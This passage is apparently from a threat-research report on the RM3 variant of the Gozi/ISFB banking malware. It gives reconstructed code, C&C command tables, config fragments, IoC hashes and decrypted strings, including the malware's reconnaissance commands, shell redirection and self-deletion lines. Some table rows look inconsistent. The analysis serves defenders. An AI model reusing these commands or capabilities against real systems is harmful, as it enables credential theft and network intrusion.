!_InterlockedExchangeAdd(&g_AttachCount, 0xFFFFFFFF) ) {\n  ModuleCleanup();\n }\n return Ret;\n}\n\n```\nIt is only when we get to the ModuleStartup call that things start to become interesting. This\ncode has been refactored and adjusted to the RM3 philosophy:\n\n\n-----\n\n```\nstatic WINERROR ModuleStartup(HMODULE hModule) {\n  WINERROR Status;\n  RM3_Struct RM3;\n  // Need mandatory RM3 Struct Variable, that contains everything\n  // By calling an export function from BL.DLL\n     RM3 = bl!GetRM3Struct(); \n  // Decrypting the .bss section\n  // CsDecryptSection is the supposed name based on ISFB leak\n     Status = bl!CsDecryptSection(hModule, 0);\n  if ( (gs_Cookie ^ RM3->dCrc32ExeName) == PROCESSNAMEHASH )\n     Status = Startup()\n       return(Status);\n}\n\n```\nThis adjustment is pretty similar in all modules and can be summarised as three main steps:\n\nRequesting from bl.dll a critical global structure (called RM3_struct for the purpose of\nthis article) which has the minimal requirements for running the injected code smoothly.\nThe structure itself changes based on which module it is. For example, bl.dll mostly\nuses it for recreating values that seem to be part of the PEB (hypothesis); explorer.dll\nuses this structure for storing timeout values and browsers.dll uses it for RM3 injects\nconfigurations.\nDecrypting the .bss section.\nEntering into the checking routine by using an ingenious mechanism:\n\nThe filename of the child process is converted into a JamCRC32 hash and\ncompared with the one stored in the startup function. If it matches, the module\nstarts its worker routine, otherwise it quits.\n\nThese are a just a few particular cases, but the philosophy of the RM3 Module startup is well\nrepresented here. It is a simple and clever move for monitoring user interactions, because it\nhas control over everything coming from explorer.exe.\n\n## bl.dll – The backbone of RM3\n\nThe background loader is almost nothing and everything at the same time. It’s the root of the\nwhole RM3 infrastructure when it’s fully installed and configured by the initial loader. Its focus\nis mainly to initialise RM3_Struct and permits and provides a fundamental RM3 API to all\nother modules:\n\n\n-----\n\n```\nOrdinal  | Goal\n==========================================\n856b0d0_1 | bl!GetBuild\n856b0d0_2 | bl!GetRM3Struct\n856b0d0_3 | bl!WaitForSingleObject\n856b0d0_4 | bl!GenerateRNG\n856b0d0_5 | bl!GenerateGUIDName\n856b0d0_6 | bl!XorshiftStar\n856b0d0_7 | bl!GenerateFieldName\n856b0d0_8 | bl!GenerateCRC32Checksum\n856b0d0_9 | bl!WaitForMultipleObjects\n856b0d0_10 | bl!HeapAlloc\n856b0d0_11 | bl!HeapFree\n856b0d0_12 | bl!HeapReAlloc\n856b0d0_13 | bl!???\n856b0d0_14 | bl!Aplib\n856b0d0_15 | bl!ReadSubKey\n856b0d0_16 | bl!WriteSubKey\n856b0d0_17 | bl!CreateProcessA\n856b0d0_18 | bl!CreateProcessW\n856b0d0_19 | bl!GetRM3MainSubkey\n856b0d0_20 | bl!LoadModule\n856b0d0_21 | bl!???\n856b0d0_22 | bl!OpenProcess\n856b0d0_23 | bl!InjectDLL\n856b0d0_24 | bl!ReturnInstructionPointer\n856b0d0_25 | bl!GetPRNGValue\n856b0d0_26 | bl!CheckRSA\n856b0d0_27 | bl!Serpent\n856b0d0_28 | bl!SearchConfigFile\n856b0d0_29 | bl!???\n856b0d0_30 | bl!ResolveFunction01\n856b0d0_31 | bl!GetFunctionByIndex\n856b0d0_32 | bl!HookFunction\n856b0d0_33 | bl!???\n856b0d0_34 | bl!ResolveFunction02\n856b0d0_35 | bl!???\n856b0d0_36 | bl!GetExplorerPID\n856b0d0_37 | bl!PsSupSetWow64Redirection\n856b0d0_40 | bl!MainRWFile\n856b0d0_42 | bl!PipeSendCommand\n856b0d0_43 | bl!PipeMainRWFile\n856b0d0_44 | bl!WriteFile\n856b0d0_45 | bl!ReadFile\n856b0d0_50 | bl!RebootBlModule\n856b0d0_51 | bl!LdrFindEntryForAddress\n856b0d0_52 | bl!???\n856b0d0_55 | bl!SetEAXToZero\n856b0d0_56 | bl!LdrRegisterDllNotification\n856b0d0_57 | bl!LdrUnegisterDllNotification\n856b0d0_59 | bl!FillGuidName\n856b0d0_60 | bl!GenerateRandomSubkeyName\n856b0d0_61 | bl!InjectDLLToSpecificPID\n856b0d0_62 | bl!???\n856b0d0_63 | bl!???\n\n```\n\n-----\n\n```\n856b0d0_65 | bl!???\n856b0d0_70 | bl!ReturnOne      \n856b0d0_71 | bl!AppAlloc\n856b0d0_72 | bl!AppFree\n856b0d0_73 | bl!MemAlloc\n856b0d0_74 | bl!MemFree\n856b0d0_75 | bl!CsDecryptSection (Decrypt bss, real name from isfb leak source code)\n856b0d0_76 | bl!CreateThread\n856b0d0_78 | bl!GrabDataFromRegistry\n856b0d0_79 | bl!Purge\n856b0d0_80 | bl!RSA\n\n## explorer.dll – the RM3 mastermind\n\n```\nExplorer.dll could be regarded as the opposite of the background loader. It is designed to\nmanage all interactions of this banking malware, at any level:\n\nChecking timeout timers that could lead to drastic changes in RM3 operations\nAllowing and executing all tasks that RM3 is able to perform\nStarting fundamental grabbing features\nDownload and update modules and configs\nLaunch modules\nModifying RM3 URIs dynamically\n\n_An overview of the RM3 explorer.dll module_\nIn the task manager worker, the workaround looks like the following:\n\n\n-----\n\n_RM3 task manager implemented in explorer.dll_\nInterestingly, the RM3 developers abuse their own hash system (JAMCRC32) by shuffling\nhashes into very large amounts of conditions. By doing this, they create an ecosystem that is\nseemingly unique to each build. Because of this, it feels a major update has been performed\non an RM3 module although technically it is just another anti-disassembly trick for greatly\nslowing down any in-depth analysis. On the other hand, this task manager is a gold mine for\nunderstanding how all the interactions between bots and the C&C are performed and how to\nfilter them into multiple categories.\n\n### General command\n\n**General commands**\n\n**CRC** **Command** **Description**\n\n0xdf43cd90 CRASH Generate and send a crash report\n\n0x274323e2 RESTART Restart RM3\n\n0xce54bcf5 REBOOT Reboot system\n\n**Recording**\n\n**CRC** **Command** **Description**\n\n0x746ce763 VIDEO Start desktop recording of the victim machine\n\n0x8de92b0d SETVIDEO VIDEO pivot condition\n\n0x54a7c26c SET_VIDEO Preparing desktop recording\n\n**Updates**\n\n\n-----\n\n**CRC** **Command** **Description**\n\n0xb82d4140 UPDATE_ALL Forcing update for all module\n\n0x4f278846 LOAD_UPDATE Load & Execute and updated PX module\n\n**Tasks**\n\n**CRC** **Command** **Description**\n\n0xaaa425c4 USETASKKEY Use task.bin pubkey for decrypting upcoming tasks\n\n**Timeout settings**\n\n**CRC** **Command** **Description**\n\n0x955879a6 SENDTIMEOUT Timeout timer for receiving commands\n\n0xd7a003c9 CONFIGTIMEOUT Timeout timer for receiving inject config updates\n\n0x7d30ee46 INITIMEOUT Timeout timer for receiving INI config update\n\n0x11271c7f IDLEPERIOD Timeout timer for bot inactivity\n\n0x584e5925 HOSTSHIFTTIMEOUT Timeout timer for switching C&C domain list\n\n0x9dd1ccaf STANDBYTIMEOUT Timeout timer for switching primary C&C’s to\nStand by ones\n\n0x9957591 RUNCHECKTIMEOUT Timeout timer for checking & run RM3 autorun\n\n0x31277bd5 TASKTIMEOUT Timeout timer for receiving a task request\n\n**Clearing**\n\n**CRC** **Command** **Description**\n\n0xe3289ecb CLEARCACHE CLR_CACHE pivot condition\n\n0xb9781fc7 CLR_CACHE Clear all browser cache\n\n0xa23fff87 CLR_LOGS Clear all RM3 logs currently stored\n\n0x213e71be DEL_CONFIG Remove requested RM3 inject config\n\n**HTTP**\n\n\n-----\n\n**CRC** **Command** **Description**\n\n0x754c3c76 LOGHTTP Intercept & log POST HTTP communication\n\n0x6c451cb6 REMOVECSP Remove CSP headers from HTTP\n\n0x97da04de MAXPOSTLENGTH Clear all RM3 logs currently stored\n\n**Process execution**\n\n**CRC** **Command** **Description**\n\n0x73d425ff NEWPROCESS Initialising RM3 routine\n\n**Backup**\n\n**CRC** **Command** **Description**\n\n0x5e822676 STANDBY Case condition if primary servers are not responding for X\nminutes\n\n**Data gathering**\n\n**CRC** **Command** **Description**\n\n0x864b1e44 GET_CREDS Collect credentials\n\n0xdf794b64 GET_FILES Collect files (grabber module)\n\n0x2a77637a GET_SYSINFO Collect system information data\n\n**Main tasks**\n\n**CRC** **Command** **Description**\n\n0x3889242 LOAD_CONFIG Download and Load a requested config with specific\narguments\n\n0xdf794b64 GET_FILES Download a DLL from a specific URL and load it into\nexplorer.exe\n\n0xae30e778 LOAD_EXE Download an executable from a specific URL and load it\n\n0xb204e7e0 LOAD_INI Download and load an INI file from a specific URL\n\n0xea0f4d48 LOAD_CMD Load and Execute Shell module\n\n\n-----\n\n**CRC** **Command** **Description**\n\n0x6d1ef2c6 LOAD_FTP Load and Execute FTP module with specific arguments\n\n0x336845f8 LOAD_KEYLOG Load and Execute keylog module with specific\narguments\n\n0xdb269b16 LOAD_MODULE Load and Execute RM3 PX Module with specific\narguments\n\n0x1e84cd23 LOAD_SOCKS Load and Execute socks module with specific\narguments\n\n0x45abeab3 LOAD_VNC Load and Execute VNC module with specific arguments\n\n**Shell command**\n\n**CRC** **Command** **Description**\n\n0xb88d3fdf RUN_CMD Execute specific command and send the output to the C&C\n\n**URI setup**\n\n**CRC** **Command** **Description**\n\n0x9c3c1432 SET_URI Change the URI path of the request\n\n**File storage**\n\n**CRC** **Command** **Description**\n\n0xd8829500 STORE_GRAB Save grabber content into temporary file\n\n0x250de123 STORE_KEYLOG Save keylog content into temporary file\n\n0x863ecf42 STORE_MAIL Save stolen mail credentials into temporary file\n\n0x9b587bc4 STORE_HTTPLOG Save stolen http interceptions into temporary file\n\n0x36e4e464 STORE_ACC Save stolen credentials into temporary file\n\n### Timeout system\n\nWith its timeout values stored into its rm3_struct, explorer.dll is able to manage every\npossible worker task launched and monitor them. Then, whenever one of the timers reaches\nthe specified value, it can modify the behaviour of the malware (in most cases, avoiding\nunnecessary requests that could create noise and so increase the chances of detection).\n\n\n-----\n\n_COM Objects being inspected for possible timeout_\n\n### Backup controllers\n\nIn the same way, explorer.dll also provides additional controllers which are called ‘stand by’\ndomains. The idea behind this is that, when principal controller C&Cs don’t respond, a\nmodule can automatically switch to this preset list. Those new domains are stored in\nexplorer.ini.\n```\n{\n   \"STANDBY\": \"standbydns1.tld\",\"standbydns2.tld\" \n  \"STANDBYTIMEOUT\": \"60\"          // Timeout in minutes\n}\n\n```\nIn the example above, if the primary domain C&Cs did not respond after one hour, the\nrequest would automatically switch to the standby C&Cs.\n\n### Desktop recording and RM3 – An ingenious way to check bots\n\nRarely mentioned in the wild but actively used by TAs, RM3 is also able to record bot\ninteractions. The video setup is stored in the client.ini file, which the bot receives from the\ncontroller domain.\n```\n\"SETVIDEO\": [\n    \"30,\",   // 30 seconds\n    \"8,\",   // 8 Level quality (min:1 - max:10)\n    \"notipda\" // Process name list  \n],\n\n```\nBehind “SETVIDEO”, only 3 values are required to setup video recording:\n\n\n-----\n\n_RM3 AVI recording setup_\nAfter being initialised, the task waits its turn to be launched. It can be triggered to work in\nmultiple ways:\n\nDetecting the use of specific keywords in a Windows process\nUsing RM3’s increased debugging telemetry to detect if something is crashing, either in\nthe banking malware itself or in a deployed injects (although the ability to detect\ncrashes in an inject is only hypothetical and has not been observed)\nRecording user interactions with a bank account; the ability to record video is a\nrelatively new but killer move on the part of the malware developers allowing them to\ncheck legitimate bots and get injects\n\nThe ability to record video depends only on “@VIDEO=” being cached by the browser\nmodule. It is not primarily seen at first glance when examining the config, but likely inside\nexternal injects parts.\n```\n@ ISFB Code leak\nВкладка Video - запись видео с экрана\nOpcode = \"VIDEO\"\nUrl - задает шаблон URL страницы, для которой необходмо сделать запись видео с экрана\nTarget - (опционально) задает ключевое слово, при наличии которого в коде страницы\nбудет сделана запись\nVar - задаёт длительность записи в секундах\n\n```\n\n-----\n\n_RM3 browser webinject module detecting if it needs to launch a recording session (or any_\n_other particular task)._\n\n### RM3 and its remote shell module – a trump card for ransomware gangs\n\nBanking malware having its own remote shell module changes the potential impact of\ninfecting a corporate network drastically. This shell is completely custom to the malware and\nis specially designed. It is also significantly less detectable than other tools currently seen for\nstarting lateral movement attacks due to its rarity. The combination of potentially much\ngreater impact and lower detectability make this piece of code a trump card, particularly as\nthey now look to migrate to a ransomware model.\n\nCalled cmdshell, this module isn’t exclusive to RM3 but has in fact, been part of ISFB since\nat least build v2.15. It has likely been of interest for TA groups in fields less focused on fraud\nsince then. The inclusion of a remote shell obviously greatly increases the flexibility this\nmalware family provides to its operators; but also, of course, makes it harder to ascertain the\nexact purpose of any one infection, or the motivation of its operators.\n\n_Cmdshell module being launched by the RM3 Task Manager_\nAfter being executed by the task command “LOAD_CMD”, the injected module installs a\npersistent remote shell which a TA can use to perform any kind of command they want.\n\n\n-----\n\n_RM3 cmdshell module creating the remote shell_\nAs noted above, the inclusion of a shell gives great flexibility, but can certainly facilitate the\nwork of at least two types of TA:\n\nFraudsters (if the VNC/SOCKS module isn’t working well, perhaps)\nMalicious Red teams affiliated with ransomware gangs\n\nIt’s worth noting that this remote shell should not be confused with the RUN_CMD command.\nThe RUN_CMD is used to instruct a bot to execute a simple command with the output saved\nand sent to the Controllers. It is also present as a simple condition:\n\n_RUN_CMD inside the RM3 Task Manager_\nThen following a standard I/O interaction:\n\n\n-----\n\n_Executing task in cmd console and saving results into an archive_\nBut both RM3’s remote shell and the RUN_CMD can be an entry point for pushing other\nspecialised tools like Cobalt Strike, Mimikatz or just simple PowerShell scripts. With this kind\nof flexibility, the main limitation on the impact of this malware is any given TA’s level of skill\nand their imagination.\n\n### Task.key – a new weapon in RM3’s encryption paranoia\n\nImplemented sometime around Q2 2020, RM3 decided to add an additional layer of\nprotection in its network communications by updating the RSA public key used to encrypt\ncommunications between bot and controller domains.\n\nThey designed a pivot condition (USETASKKEY) that decides which RSA.KEY and\nTASK.KEY will be used for decrypting the content from the C&C depending of the\ncommand/content received. We believed this choice has been developed for breaking\nresearcher for emulating RM3 traffic.\n\n\n-----\n\n_Extra_\n\n_condition with USETASKKEY to avoid using the wrong RSA pubkey_\n\n### RM3 – A banking malware designed to debug itself\n\nAs we’ve already noted, RM3 represents a significant step change from previous versions of\nISFB. These changes extend from major architecture changes down to detailed functional\nchanges and so can be expected to have involved considerable development and probably\ntesting effort, as well. Whether or not the malware developers found the troubleshooting for\nthe RM3 variant more difficult than previously, they also took the opportunity to include a\ntroubleshooting feature. If RM3 experiences any issues, it is designed to dump the relevant\nprocess and send a report to the C&C. It’s expected that this would then be reported to the\nmalware developers and so may explain why we now see new builds appearing in the wild\nrather faster than we have previously.\n\nThe task is initialised at the beginning of the explorer module startup with a simple\nworkaround:\n\nAddress of the **[MiniDumpWritDump function from dbghelp.dll is stored](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)**\nThe path of the temporary dump file is stored in C://tmp/rm3.dmp\nAll these values are stored into a designed function and saved into the RM3 master\nstruct\n\n\n-----\n\n_Crash dump being initialized and stored into the RM3 global structure_\nWith everything now configured, RM3 is ready for two possible scenarios:\n\nVoluntarily crashing itself with the command ‘CRASH’\nSomething goes wrong and so a specific classic error code triggers the function\n\n_RM3 executing the crash dump routine_\n\n## Stolen Data – The (old) gold mine\n\nGathering interesting bots is a skill that most banking malware TAs have decent experience\nwith after years of fraud. And nowadays, with the ransomware market exploding, this\nexpertise probably also permits them to affiliate more easily with ransom crews (or even to\nhave exclusivity in some cases).\n\nIn general, ISFB (v2 and v3) is a perfect playground as it can be used as a loader with more\nadvanced telemetry than classic info-stealers. For example, Vidar, Taurus or Raccoon\n**Stealer can’t compete at this level. This is because the way they are designed to work as a**\none-shot process (and be removed from the machine immediately afterwards) makes them\nmuch less competitive than the more advanced and flexible ISFB. Of course, in any given\nsituation, this does not necessarily mean they are less important than banking malware. And\nwe should keep in mind the fact that the Revil gang bought the source code for the Kpot\nstealer and it is likely this was so they could develop their own loader/stealer.\n\n**RM3 can be split into three main parts in terms of the grabber:**\n\n\n-----\n\nFiles/folders\nBrowser credential harvesting\nMail\n\n_An overview of standard stealing feature developed by RM3_\nIt’s worth noting that the mail module is an underrated feature that can provide a huge\namount of information to a TA:\n\nMany users store nearly everything in their email (including passwords and sensitive\ndocuments)\nMails can be stolen and resold to spammers for crafting legitimate mails with malicious\nattachments/links\n\n### Stealing/intercepting HTTP and HTTPS communication\n\n**RM3 implements an SSL Proxy and so is really effective at intercepting POST requests**\nperformed by the user. All of them are stored and sent every X minutes to the controllers.\n\n\n-----\n\n_RM3 browser module initializing the SSL proxy interception_\n\n_RM3 SSL Proxy running on MsEdge_\nWhenever the user visits a website, part of the inject config will automatically replace strings\nor variables in the code (‘base’) with the new content (‘new_var’); this often includes a URL\npath from an inject C&C.\n\nAs if that wasn’t complicated enough, most of them are geofencedand it could be possible\nthey manually allow the bot to get them (especially with the elite one). Indeed, this is another\ntrick for avoiding analysts and researchers to get and report those scripts that cost millions\nto financial companies.\n\n_A typical inject entry in config.bin_\nA parser then modifies the variable ‘@ID@ and ‘@GROUP@’ to the correct values as stored\nin RM3_Struct and other structures relevant to the browsers.dll module.\n\n\n-----\n\n_Browser inject module parsing config.bin and replacing with respective botid and groupid_\n\n### System information gathering\n\nGathering system information is simple with RM3:\n\nManually (using a specific RUN_CMD command)\nRequesting info from a bot with GET_SYSINFO\n\nIndeed, GET_SYSINFO is known and regularly used by ISFB actors (both active strains)\n```\nsysteminfo.exe\ndriverquery.exe\nnet view\nnslookup 127.0.0.1\nwhoami /all\nnet localgroup administrators\nnet group \"domain computers\" /domain\n\n```\nTAs in general are spending a lot of time (or are literally paying people) to inspect bots for\nthe stolen data they have gathered. In this regard, bots can be split into one of the following\ngroups:\n\nHome bots (personal accounts)\nResearcher bots\nCorporate bots (compromised host from a company)\n\nOver the past 6 months, ISFB v2 has been seen to be extremely active in term of updates.\nOne purpose of these updates has been to help TAs filter their bots from the loader side\ndirectly and more easily. This filtering is not a new thing at all, but it is probably of more\ninterest (and could have a greater impact) for malicious operations these days.\n\n### Microsoft Edge (Chromium) joining the targeted browser list\n\n\n-----\n\nOne critical aspect of any banking malware is the ability to hook into a browser so as to inject\nfakes and replacers in financial institution websites.\n\nAt the same time as the Task.key implementation, RM3 decided to implement a new browser\nin its targeted list: “MsEdge”. This was not random, but was a development choice driven by\nthe sheer number of corporate computers migrating from Internet Explorer to Edge.\n\n_RM3 MsEdge startup module_\nThis means that 5 browsers are currently targeted:\n\nInternet Explorer\nMicrosoft Edge (Original)\nMicrosoft Edge (Chromium)\nMozilla Firefox\nGoogle Chrome\n\nCurrently, RM3 doesn’t seem to interact with Opera. Given Opera’s low user share and\nalmost non-existent corporate presence, it is not expected that the development of a new\nmodule/feature for Opera would have an ROI that was sufficiently attractive to the TAs and\n**RM3 developers. Any development and debugging would be time consuming and could**\ndelay useful updates to existing modules already producing a reliable return.\n\n## RM3 and its homemade forked SQLITE module\n\nA lot of this blogpost has been dedicated to discussing the innovative design and features in\nRM3. But perhaps the best example of the attention to detail displayed in the design and\ndevelopment of this malware is the custom SQLITE3 module that is included with RM3.\nPresumably driven by the need to extract credentials data from browsers (and related tasks),\nthey have forked the original SQLite3 source code and refactored it to work in RM3.\n\nUsing SQLite is not a new thing, of course, as it was already noted in the ISFB leak.\n\n\n-----\n\nInterestingly, the RM3 build is based on the original 3.8.6 build and has all the features and\nfunctions of the original version.\n\nBecause the background loader (bl.dll) is the only module within RM3 technically capable of\nperforming allocation operations, they have simply integrated “free”, “malloc”, and “realloc”\nAPI calls with this backbone module.\n\n## What’s new with Build 300960?\n\n### Goodbye Serpent, Hello AES!\n\nAround mid-march, RM3 pushed a major update by replacing the Serpent encryption with the\ngood old AES 128 CBC. All locations where Serpent encryption was used, have been totally\nreworked so as to work with AES.\n\n\n-----\n\n_AES 128 CBC implementation in RM3_\n\n### RM3 C&C response also reviewed\n\nBefore build 300960, RM3 treated data received from controllers as described below.\nInformation was split into two encrypted parts (a header and a body) which are treated\ndifferently:\n\n1. The encrypted head was decrypted with the public RSA key extracted from modules, to\n\nextract a Serpent key\n2. This Serpent key was then used to decrypt the encrypted data in the body (this is a\n\ndifferent key from client.ini and loader.ini).\n\nThis was the setup before build 300960:\n\n\n-----\n\nNow, in the recently released 300960 build, with Serpent removed and AES implemented\ninstead, the structure of the encrypted header has changed as indicated below:\n\nThe decrypted body data produced by this process is not in an entirely standard format. In\nfact, it’s compressed with the APlib library. But removing the first 0x14 bytes (or sometimes\n0x4 bytes) and decompressing it, ensures that the final block is ready for analysis.\n\nIf it’s a DLL, it will be recognised with the PX format\nIf it’s web injects, it’s an archive that contains .sig files (that is, MAIN.SIG†)\nIf it’s tasks or config updates, these are in a classic raw ISFB config format\n\n_† SIG can probably be taken to mean ‘signature’_\n\n### Changes in .ini files\n\n\n-----\n\nTwo fields have been added in the latest campaigns. Interestingly, these are not new RM3\nfeatures but old ones that have been present for quite some time.\n```\n{\n  \"SENDFGKEY\": \"0\",  // Send Foreground Key\n  \"SUBDOMAINS\": \"0\", \n}\n\n## Appendix\n\n### IoCs – Campaign\n00cd7319a42bbabd0c81a7e9817d2d5071738d5ac36b98b8ff9d7383c3d7e1ba - DE\na7007821b1acbf36ca18cb2ec7d36f388953fe8985589f170be5117548a55c57 - Italy\n5ee51dfd1eb41cb6ce8451424540c817dbd804f103229f3ae1b645b320cbb4e8 - Australia/NZ 1\nc7552fe5ed044011aa09aebd5769b2b9f3df0faa8adaab42ef3bfff35f5190aa - Australia/NZ 2\n261c6f7b7e9d8fc808a4a9db587294202872b2a816b2b98516551949165486c8 - UK 1\n2e0b219c5ac3285a08e126f11c07ea3ac60bc96d16d37c2dc24dd8f68c492a74 - UK 2\n6818b6b32cb91754fd625e9416e1bc83caac1927148daaa3edaed51a9d04e864 - Worldwide ?\n86b670d81a26ea394f7c0edebdc93e8f9bd6ce6e0a8d650e32a0fe36c93f0dee - GoziAT/ISFB RM2\n\n IoCs – Modules\n\n```\n\n-----\n\n```\nb15c3b93f8de40b745eb1c1df5dcdee3371ba08a1a124c7f20897f87f23bcd55 loader.exe (Build\n300932)\nce4fc5dcab919ea40e7915646a3ce345a39a3f81c33758f1ba9c1eae577a5c35 loader.dll (Build\n300932)\nba0e9cb3bf25516e2c1f0288e988bd7bd538d275373d36cee28c34dafa7bbd1f explorer.dll (Build\n300932)\naccb76e6190358760044d4708e214e546f87b1e644f7e411ba1a67900bcd32a1 bl.dll (Build\n300932)\nf90ed3d7c437673c3cfa3db8e6fbb3370584914def2c0c2ce1f11f90f199fb4f ntwrk.dll (Build\n300932)\n38c9aff9736eae6db5b0d9456ad13d1632b134d654c037fba43086b5816acd58 rt.dll (Build\n300932)\n2c7cdcf0f9c2930096a561ac6f9c353388a06c339f27f70696d0006687acad5b browser.dll (Build\n300932)\n34517a7c78dd66326d0d8fbb2d1524592bbbedb8ed6b595281f7bb3d6a39bc0a chrome.dll (Build\n300932)\n59670730341477b0a254ddbfc10df6f1fcd3471a08c0d8ec20e1aa0c560ddee4 firefox.dll (Build\n300932)\nd927f8793f537b94c6d2299f86fe36e3f751c94edca5cd3ddcdbd65d9143b2b6 iexplorer.dll\n(Build 300932)\n199caec535d640c400d3c6b35806c74912b832ff78cb31fd90fe4712ed194b09 microsoftedgecp.dll\n(Build 300932)\n13635b2582a11e658ab0b959611590005b81178365c12062e77274db1d0b4f0c msedge.dll (Build\n300932)\n65a1923e037bce4816ac2654c242921f3e3592e972495945849f155ca69c05e5 loader.dll (Build\n300960)\nd1f5ef94e14488bf909057e4a0d081ff18dd0ac86f53c42f53b12ea25cdcfe76 cmdshell.dll (Build\n300869)\n820faca1f9e6e291240e97e5768030e1574b60862d5fce7f6ba519aaa3dbe880 vnc.dll (Build\n300869)\n\n### Shellcode – startup module – bss decrypted\n\n```\n\n-----\n\n```\nWindows Security\nNTDLL.DLL\nRtlExitUserProcess\nKERNEL32.DLL\nbl.dll - bss decrypted\nMicrosoft Windows\nKERNEL32.DLL\nADVAPI32.DLL\nNTDLL.DLL\nKERNELBASE\nUSER32\nLdrUnregisterDllNotification\nResolveDelayLoadsFromDll\nSoftware\nWow64EnableWow64FsRedirection\n\\REGISTRY\\USER\\%s\\%s\\\n{%08X-%04X-%04X-%04X-%08X%04X}\nSetThreadInformation\nGetWindowThreadProcessId\n%08X-%04X-%04X-%04X-%08X%04X\nRtlExitUserThread\nS-%u-%u\n-%u\nLocal\\\n\\\\.\\pipe\\\n%05u\nLdrRegisterDllNotification\nNtClose\nZwProtectVirtualMemory\nLdrGetProcedureAddress\nWaitNamedPipeW\nCallNamedPipeW\nLdrLoadDll\nNtCreateUserProcess\n.dll\n%08x\nGetShellWindow\n\\KnownDlls\\ntdll.dll\n%systemroot%\\system32\\c_1252.NLS\n\\??\\\n\\\\?\\\n\n### explorer.dll – bss decrypted\n\n```\n\n-----\n\n```\nindows Security\n.jpeg\nMain\n.gif\n.bmp\n%APPDATA%\\Microsoft\\\ntasklist.exe /SVC\n\\Microsoft\\Windows\\\ncmd /C \"%s\" >> %S0\nsysteminfo.exe\ndriverquery.exe\nnet view\nnslookup 127.0.0.1\nwhoami /all\nnet localgroup administrators\nnet group \"domain computers\" /domain\nreg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s\ncmd /U /C \"type %S0 > %S & del %S0\"\necho -------- %u\nKERNELBASE\n.exe\nRegGetValueW\n0x%S\n.DLL\nDllRegisterServer\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize\n0x%X,%c%c\nStartupdelayinmsec\nICGetInfo\nSOFTWARE\\Classes\\Chrome\nDelegateExecute\n\\\\?\\\n%userprofile%\\appdata\\local\\google\\chrome\\user data\\default\\cache\n\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nhttp\\shell\\open\\command\nICSendMessage\n%08x\n | \"%s\" | %u\nmsvfw32\nICOpen\nICClose\nICInfo\nmain\n%userprofile%\\AppData\\Local\\Mozilla\\Firefox\\Profiles\n.avi\nhttps://\nVideo: sec=%u, fps=%u, q=%u\nLocal\\\n%userprofile%\\appdata\\local\\microsoft\\edge\\user data\\default\\cache\nMiniDumpWriteDump\ncache2\\entries\\*.*\n%PROGRAMFILES%\\Mozilla Firefox\n%USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default*\nSoftware\\Classes\\CLSID\\%s\\InProcServer32\nopen\n\n```\n\n-----\n\n```\nhttp://\nfile://\nDBGHELP.DLL\n%temp%\\rm3.dmp\n%u, 0x%x, \"%S\"\n\"%S\", 0x%p, 0x%x\n%APPDATA%\nSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\nInstallDate\n\n### rt.dll – bss decrypted\nWindows Security\n%s%02u:%02u:%02u\n:%u\nattrib -h -r -s %%1\ndel %%1\nif exist %%1 goto %u\ndel %%0\nLow\\\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq\n*.*\n.bin\nopen\n%02u-%02u-%02u %02u:%02u:%02u\n*.dll\n%systemroot%\\system32\\c_1252.NLS\nrundll32 \"%s\",%S %s\n\"%s\"\ncmd /C regsvr32 \"%s\"\nMb=Lk\nAuthor\nn;\nQkkXa\nM<q\n\n netwrk.dll – bss decrypted\n\n```\n\n-----\n\n```\n&WP\nPOST\nHost\n%04x%04x\nGET\nWindows Security\nContent-Type: multipart/form-data; boundary=%s\nContent-Type: application/octet-stream\n--%s\n--%s-%c%02X\nhttps://\nhttp://\n%08x%08x%08x%08x\nform\n%s=%s&\n/images/\n.bmp\nfile://\ntype=%u&soft=%u&version=%u&user=%08x%08x%08x%08x&group=%u&id=%08x&arc=%u&crc=%08x&size\nindex.html\nContent-Disposition: form-data; name=\"%s\"\n; filename=\"%s\"\n&os=%u.%u_%u_%u_x%u\n&ip=%s\nMozilla/5.0 (Windows NT %u.%u%s; Trident/7.0; rv:11.0) like Gecko\n; Win64; x64\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n%08x\n|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq\nF%D,3\noverridelink\ninvalidcert\n9*.onion\n&sysid=%08x%08x%08x%08x\n\n### browser.dll – bss decrypted\n\n```\n\n-----\n\n```\n%c%02X\n.php\nWindows Security\n1.3.6.1.5.5.7.3.2\n1.3.6.1.5.5.7.3.1\n2.5.29.15\n2.5.29.37\n2.5.29.1\n2.5.29.35\n2.5.29.14\n2.5.29.10\n2.5.29.19\n1.3.6.1.5.5.7.1.1\n2.5.29.32\n1.3.6.1.5.5.7.1.11\n1.3.6.1.5.5.7\n1.3.6.1.5.5.7.1\n2.5.29.31\n1.2.840.113549.1.1.11\n1.2.840.113549.1.1.5\nWS2_32.dll\niexplore.hlp\nConnectEx\nLocal\\\nWSOCK32.DLL\nWININET.DLL\nCRYPT32.DLL\nsocket\nconnect\nclosesocket\ngetpeername\nWSAStartup\nWSACleanup\nWSAIoctl\nUser-Agent\nContent-Type\nContent-Length\nConnection\nContent-Security-Policy\nContent-Security-Policy-Report-Only\nX-Frame-Options\nAccess-Control-Allow-Origin\nchunked\nWebSocket\nTransfer-Encoding\nContent-Encoding\nAccept-Encoding\nAccept-Language\nCookie\nidentity\ngzip, deflate\ngzip\nHost\n://\nHTTP/1.1 404 Not Found\n\n```\n\n-----\n\n```\nContent Length: 0\n://\nHTTP/1.1 503 Service Unavailable\nContent-Length: 0\nhttp://\nhttps://\nReferer\nUpgrade\nCache-Control\nLast-Modified\nEtag\nno-cache, no-store, must-revalidate\nocsp\nTEXT HTML JSON 